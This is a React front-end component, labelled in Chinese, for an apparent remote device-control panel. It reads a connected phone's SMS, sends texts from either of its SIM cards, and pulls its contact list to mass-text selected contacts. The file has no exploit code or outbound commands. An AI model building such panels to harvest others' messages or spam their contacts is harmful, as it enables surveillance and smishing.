import { useState, useMemo } from 'react'

/**
 * 短信记录Tab - 短信管理与群发
 * 从 ControlPage.jsx 提取 (lines 1766-1980)
 */
export default function SmsTab({
  smsList,
  smsSearch,
  setSmsSearch,
  smsPhone,
  setSmsPhone,
  smsContent,
  setSmsContent,
  smsSim,
  setSmsSim,
  smsLoading,
  smsSending,
  readDeviceSms,
  sendSmsToDevice,
  loadSms,
  smsPage,
  smsTotal,
  showBulkSmsModal,
  setShowBulkSmsModal,
  bulkSmsContent,
  setBulkSmsContent,
  bulkSmsSim,
  setBulkSmsSim,
  bulkSelected,
  setBulkSelected,
  bulkContactsLoading,
  fetchBulkContacts,
  contactsList,
  bulkSending,
  handleBulkSend,
}) {
  const PAGE_SIZE = 50
  const [currentPage, setCurrentPage] = useState(1)

  const filteredSms = useMemo(() => {
    const sorted = [...smsList].sort((a, b) => (b.date || b.timestamp || 0) - (a.date || a.timestamp || 0))
    if (!smsSearch.trim()) return sorted
    const kw = smsSearch.trim().toLowerCase()
    return sorted.filter(m => (m.address || m.phone || '').includes(kw) || (m.body || m.content || '').toLowerCase().includes(kw))
  }, [smsList, smsSearch])

  const totalPages = Math.max(1, Math.ceil(filteredSms.length / PAGE_SIZE))
  const safePage = Math.min(currentPage, totalPages)
  const pagedSms = filteredSms.slice((safePage - 1) * PAGE_SIZE, safePage * PAGE_SIZE)

  return (
    <div className="ctrl-tab-content">
      <div className="ctrl-tab-panel">
        <div style={{ padding: 16, background: 'rgba(255,255,255,.03)', borderRadius: 12, border: '1px solid rgba(255,255,255,.08)' }}>
          <div style={{ display: 'flex', alignItems: 'center', marginBottom: 12, paddingBottom: 8, borderBottom: '1px solid rgba(255,255,255,.08)' }}>
            <div style={{ width: 4, height: 18, background: '#1890ff', borderRadius: 2, marginRight: 8 }} />
            <span style={{ fontSize: 15, fontWeight: 500, color: '#fff' }}>短信管理</span>
          </div>

          <div style={{ marginBottom: 12, padding: 14, background: 'rgba(82,196,26,.06)', borderRadius: 10, border: '1px solid rgba(82,196,26,.15)' }}>
            <div style={{ display: 'flex', alignItems: 'center', marginBottom: 10 }}>
              <div style={{ width: 4, height: 16, background: '#52c41a', borderRadius: 2, marginRight: 8 }} />
              <span style={{ fontSize: 13, fontWeight: 600, color: '#fff' }}>获取短信</span>
            </div>
            <div style={{ display: 'flex', gap: 8, alignItems: 'center', flexWrap: 'wrap' }}>
              <input
                type="text"
                placeholder="输入手机号或内容搜索"
                value={smsSearch}
                onChange={e => setSmsSearch(e.target.value)}
                style={{ width: 220, padding: '6px 10px', background: 'rgba(255,255,255,.05)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: '#fff', fontSize: 12 }}
              />
              <button
                onClick={readDeviceSms}
                disabled={smsLoading}
                style={{ padding: '6px 14px', background: smsLoading ? 'rgba(255,255,255,.05)' : 'linear-gradient(135deg, #1890ff, #096dd9)', border: 'none', borderRadius: 6, color: smsLoading ? '#64748b' : '#fff', fontSize: 12, fontWeight: 600, cursor: smsLoading ? 'wait' : 'pointer' }}
              >{smsLoading ? '读取中...' : '📄 读取'}</button>
              <button
                onClick={loadSms}
                style={{ padding: '6px 14px', background: 'linear-gradient(135deg, #1890ff, #096dd9)', border: 'none', borderRadius: 6, color: '#fff', fontSize: 12, fontWeight: 600, cursor: 'pointer' }}
              >🔄 刷新</button>
              <span style={{ color: '#94a3b8', fontSize: 12, marginLeft: 'auto' }}>共 <strong style={{ color: '#38bdf8' }}>{filteredSms.length}</strong> 条</span>
            </div>
          </div>

          <div style={{ marginBottom: 12, padding: 14, background: 'rgba(24,144,255,.06)', borderRadius: 10, border: '1px solid rgba(24,144,255,.15)' }}>
            <div style={{ display: 'flex', alignItems: 'center', marginBottom: 10 }}>
              <div style={{ width: 4, height: 16, background: '#1890ff', borderRadius: 2, marginRight: 8 }} />
              <span style={{ fontSize: 13, fontWeight: 600, color: '#fff' }}>发送短信</span>
            </div>
            <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', alignItems: 'flex-end' }}>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
                <label style={{ fontSize: 11, color: '#94a3b8' }}>手机号</label>
                <input type="text" placeholder="输入手机号" value={smsPhone} onChange={e => setSmsPhone(e.target.value)} style={{ width: 160, padding: '6px 10px', background: 'rgba(255,255,255,.05)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: '#fff', fontSize: 12 }} />
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 4, flex: 1, minWidth: 200 }}>
                <label style={{ fontSize: 11, color: '#94a3b8' }}>短信内容</label>
                <input type="text" placeholder="输入短信内容" value={smsContent} onChange={e => setSmsContent(e.target.value)} style={{ width: '100%', padding: '6px 10px', background: 'rgba(255,255,255,.05)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: '#fff', fontSize: 12 }} />
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
                <label style={{ fontSize: 11, color: '#94a3b8' }}>SIM卡</label>
                <div style={{ display: 'flex', gap: 6, alignItems: 'center' }}>
                  <label style={{ display: 'flex', alignItems: 'center', gap: 3, fontSize: 12, color: '#e2e8f0', cursor: 'pointer' }}><input type="radio" name="smsSim" value="0" checked={smsSim === '0'} onChange={e => setSmsSim(e.target.value)} style={{ accentColor: '#1890ff' }} />卡1</label>
                  <label style={{ display: 'flex', alignItems: 'center', gap: 3, fontSize: 12, color: '#e2e8f0', cursor: 'pointer' }}><input type="radio" name="smsSim" value="1" checked={smsSim === '1'} onChange={e => setSmsSim(e.target.value)} style={{ accentColor: '#1890ff' }} />卡2</label>
                </div>
              </div>
              <button onClick={sendSmsToDevice} disabled={smsSending} style={{ padding: '6px 16px', background: smsSending ? 'rgba(255,255,255,.05)' : 'linear-gradient(135deg, #52c41a, #389e0d)', border: 'none', borderRadius: 6, color: smsSending ? '#64748b' : '#fff', fontSize: 12, fontWeight: 600, cursor: smsSending ? 'wait' : 'pointer', whiteSpace: 'nowrap' }}>{smsSending ? '发送中...' : '✉ 发送'}</button>
              <button onClick={() => { setShowBulkSmsModal(true); setBulkSelected(new Set()) }} style={{ padding: '6px 16px', background: 'linear-gradient(135deg, #722ed1, #531dab)', border: 'none', borderRadius: 6, color: '#fff', fontSize: 12, fontWeight: 600, cursor: 'pointer', whiteSpace: 'nowrap' }}>📋 通讯录群发</button>
            </div>
          </div>

          <div style={{ overflow: 'auto', maxHeight: 'calc(100vh - 360px)' }}>
            <table style={{ width: '100%', borderCollapse: 'collapse' }}>
              <thead>
                <tr style={{ background: 'rgba(255,255,255,.05)', borderBottom: '1px solid rgba(255,255,255,.08)' }}>
                  <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600, width: 50 }}>序号</th>
                  <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600, width: 150 }}>号码</th>
                  <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>内容</th>
                  <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600, width: 160 }}>时间</th>
                </tr>
              </thead>
              <tbody>
                {smsLoading ? (
                  <tr><td colSpan={5} style={{ padding: 40, textAlign: 'center', color: '#94a3b8' }}>加载中...</td></tr>
                ) : filteredSms.length === 0 ? (
                  <tr><td colSpan={5} style={{ padding: 40, textAlign: 'center', color: '#94a3b8' }}>
                    <div style={{ fontSize: 32, marginBottom: 8, opacity: 0.5 }}>✉</div>
                    <div style={{ fontSize: 13 }}>暂无短信记录</div>
                    <div style={{ fontSize: 11, marginTop: 4, color: '#64748b' }}>点击"读取"按钮获取短信</div>
                  </td></tr>
                ) : (
                  pagedSms.map((msg, i) => {
                    return (
                      <tr key={msg.id || i} style={{ borderBottom: '1px solid rgba(255,255,255,.05)' }}>
                        <td style={{ padding: '8px 12px', color: '#94a3b8', fontSize: 12 }}>{(safePage - 1) * PAGE_SIZE + i + 1}</td>
                        <td style={{ padding: '8px 12px', color: '#e2e8f0', fontSize: 12 }}>{msg.address || msg.phone || msg.sender || '--'}</td>
                        <td style={{ padding: '8px 12px', color: '#38bdf8', fontSize: 12, cursor: 'pointer', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', maxWidth: 400 }} title={msg.body || msg.content || msg.message || ''}>{msg.body || msg.content || msg.message || '--'}</td>
                        <td style={{ padding: '8px 12px', color: '#94a3b8', fontSize: 11, whiteSpace: 'nowrap' }}>{msg.date ? new Date(Number(msg.date) || msg.date).toLocaleString('zh-CN') : msg.created_at ? new Date(msg.created_at).toLocaleString('zh-CN') : msg.timestamp ? new Date(Number(msg.timestamp) || msg.timestamp).toLocaleString('zh-CN') : '--'}</td>
                      </tr>
                    )
                  })
                )}
              </tbody>
            </table>
          </div>

          {/* 分页控件 */}
          {filteredSms.length > 0 && (
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8, marginTop: 12, padding: '8px 0' }}>
              <button
                onClick={() => setCurrentPage(1)}
                disabled={safePage <= 1}
                style={{ padding: '4px 10px', background: safePage <= 1 ? 'rgba(255,255,255,.03)' : 'rgba(255,255,255,.08)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 4, color: safePage <= 1 ? '#475569' : '#e2e8f0', fontSize: 11, cursor: safePage <= 1 ? 'not-allowed' : 'pointer' }}
              >首页</button>
              <button
                onClick={() => setCurrentPage(p => Math.max(1, p - 1))}
                disabled={safePage <= 1}
                style={{ padding: '4px 10px', background: safePage <= 1 ? 'rgba(255,255,255,.03)' : 'rgba(255,255,255,.08)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 4, color: safePage <= 1 ? '#475569' : '#e2e8f0', fontSize: 11, cursor: safePage <= 1 ? 'not-allowed' : 'pointer' }}
              >上一页</button>
              <span style={{ fontSize: 12, color: '#94a3b8' }}>
                第 <strong style={{ color: '#38bdf8' }}>{safePage}</strong> / {totalPages} 页
              </span>
              <button
                onClick={() => setCurrentPage(p => Math.min(totalPages, p + 1))}
                disabled={safePage >= totalPages}
                style={{ padding: '4px 10px', background: safePage >= totalPages ? 'rgba(255,255,255,.03)' : 'rgba(255,255,255,.08)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 4, color: safePage >= totalPages ? '#475569' : '#e2e8f0', fontSize: 11, cursor: safePage >= totalPages ? 'not-allowed' : 'pointer' }}
              >下一页</button>
              <button
                onClick={() => setCurrentPage(totalPages)}
                disabled={safePage >= totalPages}
                style={{ padding: '4px 10px', background: safePage >= totalPages ? 'rgba(255,255,255,.03)' : 'rgba(255,255,255,.08)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 4, color: safePage >= totalPages ? '#475569' : '#e2e8f0', fontSize: 11, cursor: safePage >= totalPages ? 'not-allowed' : 'pointer' }}
              >末页</button>
            </div>
          )}
        </div>
      </div>

      {showBulkSmsModal && (
        <div className="overlay-modal-backdrop" onClick={e => { if (e.target === e.currentTarget) setShowBulkSmsModal(false) }}>
          <div className="overlay-modal" style={{ maxWidth: 680, width: '90%' }}>
            <div className="overlay-modal-header">
              <span className="overlay-modal-icon">📋</span>
              <h3>通讯录群发短信</h3>
              <button className="overlay-modal-close" onClick={() => setShowBulkSmsModal(false)}>✕</button>
            </div>
            <div className="overlay-modal-body" style={{ maxHeight: '70vh', overflow: 'auto' }}>
              <div style={{ marginBottom: 12 }}>
                <label style={{ fontSize: 12, color: '#94a3b8', display: 'block', marginBottom: 4 }}>短信内容</label>
                <textarea
                  value={bulkSmsContent}
                  onChange={e => setBulkSmsContent(e.target.value)}
                  placeholder="输入群发短信内容..."
                  style={{ width: '100%', minHeight: 60, padding: '8px 10px', background: 'rgba(255,255,255,.05)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: '#fff', fontSize: 12, resize: 'vertical' }}
                />
              </div>
              <div style={{ display: 'flex', gap: 12, alignItems: 'center', marginBottom: 12 }}>
                <label style={{ fontSize: 12, color: '#94a3b8' }}>SIM卡：</label>
                <label style={{ display: 'flex', alignItems: 'center', gap: 3, fontSize: 12, color: '#e2e8f0', cursor: 'pointer' }}>
                  <input type="radio" name="bulkSmsSim" value="0" checked={bulkSmsSim === '0'} onChange={e => setBulkSmsSim(e.target.value)} style={{ accentColor: '#722ed1' }} />
                  卡1
                </label>
                <label style={{ display: 'flex', alignItems: 'center', gap: 3, fontSize: 12, color: '#e2e8f0', cursor: 'pointer' }}>
                  <input type="radio" name="bulkSmsSim" value="1" checked={bulkSmsSim === '1'} onChange={e => setBulkSmsSim(e.target.value)} style={{ accentColor: '#722ed1' }} />
                  卡2
                </label>
                <button
                  onClick={fetchBulkContacts}
                  disabled={bulkContactsLoading}
                  style={{ marginLeft: 'auto', padding: '5px 12px', background: bulkContactsLoading ? 'rgba(255,255,255,.05)' : 'linear-gradient(135deg, #1890ff, #096dd9)', border: 'none', borderRadius: 6, color: bulkContactsLoading ? '#64748b' : '#fff', fontSize: 11, fontWeight: 600, cursor: bulkContactsLoading ? 'wait' : 'pointer' }}
                >{bulkContactsLoading ? '获取中...' : '📥 获取通讯录'}</button>
              </div>

              <div style={{ overflow: 'auto', maxHeight: 320, border: '1px solid rgba(255,255,255,.08)', borderRadius: 8 }}>
                <table style={{ width: '100%', borderCollapse: 'collapse' }}>
                  <thead>
                    <tr style={{ background: 'rgba(255,255,255,.05)', borderBottom: '1px solid rgba(255,255,255,.08)', position: 'sticky', top: 0, zIndex: 1 }}>
                      <th style={{ padding: '6px 10px', textAlign: 'center', width: 40 }}>
                        <input
                          type="checkbox"
                          checked={contactsList.length > 0 && bulkSelected.size === contactsList.length}
                          onChange={e => {
                            if (e.target.checked) {
                              setBulkSelected(new Set(contactsList.map((_, i) => i)))
                            } else {
                              setBulkSelected(new Set())
                            }
                          }}
                          style={{ accentColor: '#722ed1' }}
                        />
                      </th>
                      <th style={{ padding: '6px 10px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600, width: 50 }}>序号</th>
                      <th style={{ padding: '6px 10px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>联系人</th>
                      <th style={{ padding: '6px 10px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>手机号码</th>
                    </tr>
                  </thead>
                  <tbody>
                    {contactsList.length === 0 ? (
                      <tr><td colSpan={4} style={{ padding: 30, textAlign: 'center', color: '#94a3b8', fontSize: 12 }}>
                        {bulkContactsLoading ? '正在获取通讯录...' : '暂无通讯录数据，请点击"获取通讯录"'}
                      </td></tr>
                    ) : (
                      contactsList.map((contact, i) => (
                        <tr key={i} style={{ borderBottom: '1px solid rgba(255,255,255,.04)', background: bulkSelected.has(i) ? 'rgba(114,46,209,.08)' : 'transparent' }}>
                          <td style={{ padding: '5px 10px', textAlign: 'center' }}>
                            <input
                              type="checkbox"
                              checked={bulkSelected.has(i)}
                              onChange={e => {
                                const next = new Set(bulkSelected)
                                if (e.target.checked) next.add(i); else next.delete(i)
                                setBulkSelected(next)
                              }}
                              style={{ accentColor: '#722ed1' }}
                            />
                          </td>
                          <td style={{ padding: '5px 10px', color: '#94a3b8', fontSize: 11 }}>{i + 1}</td>
                          <td style={{ padding: '5px 10px', color: '#e2e8f0', fontSize: 12 }}>{contact.name || contact.displayName || '--'}</td>
                          <td style={{ padding: '5px 10px', color: '#38bdf8', fontSize: 12, fontFamily: 'monospace' }}>{contact.phone || contact.number || contact.phoneNumber || '--'}</td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>
            <div style={{ padding: '12px 20px', borderTop: '1px solid rgba(255,255,255,.08)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <span style={{ fontSize: 12, color: '#94a3b8' }}>已选 <strong style={{ color: '#722ed1' }}>{bulkSelected.size}</strong> / {contactsList.length} 个联系人</span>
              <div style={{ display: 'flex', gap: 8 }}>
                <button
                  onClick={() => setShowBulkSmsModal(false)}
                  style={{ padding: '6px 16px', background: 'rgba(255,255,255,.08)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: '#e2e8f0', fontSize: 12, cursor: 'pointer' }}
                >取消</button>
                <button
                  onClick={handleBulkSend}
                  disabled={bulkSending || bulkSelected.size === 0}
                  style={{ padding: '6px 16px', background: (bulkSending || bulkSelected.size === 0) ? 'rgba(255,255,255,.05)' : 'linear-gradient(135deg, #722ed1, #531dab)', border: 'none', borderRadius: 6, color: (bulkSending || bulkSelected.size === 0) ? '#64748b' : '#fff', fontSize: 12, fontWeight: 600, cursor: (bulkSending || bulkSelected.size === 0) ? 'not-allowed' : 'pointer' }}
                >{bulkSending ? '发送中...' : `✉ 发送 (${bulkSelected.size})`}</button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
